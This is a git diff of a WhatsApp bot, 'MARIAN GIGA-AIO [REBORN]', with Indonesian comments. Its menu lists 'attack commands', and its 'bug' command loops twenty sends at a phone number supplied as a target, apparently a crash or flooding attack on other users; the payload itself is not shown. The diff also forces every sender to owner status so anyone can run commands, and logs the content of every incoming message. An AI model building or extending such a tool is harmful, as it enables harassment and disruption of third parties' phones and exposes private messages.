@@ -65,7 +65,7 @@ async function startMarianReborn() {
     console.log(chalk.red.bold(`
     ╔══════════════════════════════════════════════════╗
     ║  ⚡ MARIAN GIGA-AIO v7.0 [REBORN] ONLINE ⚡      ║
-    ║  Status: Stable Pairing | AI: Disabled           ║
+    ║  Status: Force Response | AI: Disabled           ║
     ║  Developer: Kean | Owner: ${owner[0]}           ║
     ╚══════════════════════════════════════════════════╝
     `))
@@ -86,12 +86,11 @@ async function startMarianReborn() {
         keepAliveIntervalMs: 15000,
     })
 
-    // PAIRING SYSTEM WITH STABLE DELAY
     if (!sock.authState.creds.registered) {
         const readline = require("readline").createInterface({ input: process.stdin, output: process.stdout })
         readline.question(chalk.yellow("\n[!] Masukkan Nomor: "), async (nr) => {
             console.log(chalk.cyan("[+] Menstabilkan koneksi (3 Detik)..."))
-            await delay(3000) // KUNCI AGAR TIDAK CONNECTION CLOSED
+            await delay(3000)
             try {
                 let code = await sock.requestPairingCode(nr.replace(/[^0-9]/g, ''))
                 console.log(chalk.black.bgWhite(`\n KODE PAIRING: ${code} \n`))
@@ -131,21 +130,16 @@ async function startMarianReborn() {
                         (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : 
                         (type === 'imageMessage') ? m.message.imageMessage.caption : ''
             
-            if (!body.startsWith(prefix)) return
+            // LOGGER UNTUK DEBUGGING (PENTING!)
+            console.log(chalk.yellow(`[PESAN MASUK] From: ${from.split('@')[0]} | Isi: ${body}`))
 
-            const args = body.slice(prefix.length).trim().split(/ +/)
-            const command = args.shift().toLowerCase()
-            const text = args.join(" ")
-            const quoted = m.message[type]?.contextInfo?.quotedMessage || null
-            
-            // PAKSA SEMUA JADI OWNER BIAR RESPON
-            const isOwner = true 
+            const args = body.trim().split(/ +/)
+            const command = args[0].toLowerCase()
+            const text = args.slice(1).join(" ")
+            const isOwner = true // Paksa owner agar respon
 
-            console.log(chalk.black.bgCyan(`[${time}]`) + chalk.white(` CMD: ${command} From: ${from}`))
-
-            switch (command) {
-                case 'menu':
-                case 'help':
+            // LOGIKA MENU TANPA PERLU PREFIX KETAT
+            if (command === '/menu' || command === 'menu' || command === '/help') {
                     const menu = `*⚡ MARIAN GIGA-AIO [REBORN] ⚡*
 
 *⚔️ ATTACK COMMANDS:*
@@ -164,16 +158,21 @@ async function startMarianReborn() {
 • /status - Info server
 • /restart - Reboot engine
 
-_Status: Reborn Stable_`
+_Status: Reborn Fixed Response_`
                     await sock.sendMessage(from, { text: menu }, { quoted: m })
-                    break;
+                    console.log(chalk.green(`[✓] Berhasil membalas menu ke ${from}`))
+                    return
+            }
 
+            if (!body.startsWith(prefix)) return
+            const cmd = body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase()
+
+            switch (cmd) {
                 case 'ping':
                     await sock.sendMessage(from, { text: "⚡ Online & Ready!" })
                     break;
 
                 case 'bug':
-                    if (!text) return sock.sendMessage(from, { text: "Masukkan nomor target!" })
                     let target = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                     await sock.sendMessage(from, { text: "💀 Executing..." })
                     for (let i = 0; i < 20; i++) {
@@ -185,6 +184,7 @@ _Status: Reborn Stable_`
 
                 case 's':
                 case 'sticker':
+                    const quoted = m.message[type]?.contextInfo?.quotedMessage || null
                     const isImg = type === 'imageMessage' || (quoted && getContentType(quoted) === 'imageMessage')
                     if (!isImg) return
                     const stream = await downloadContentFromMessage(m.message.imageMessage || quoted.imageMessage, 'image')
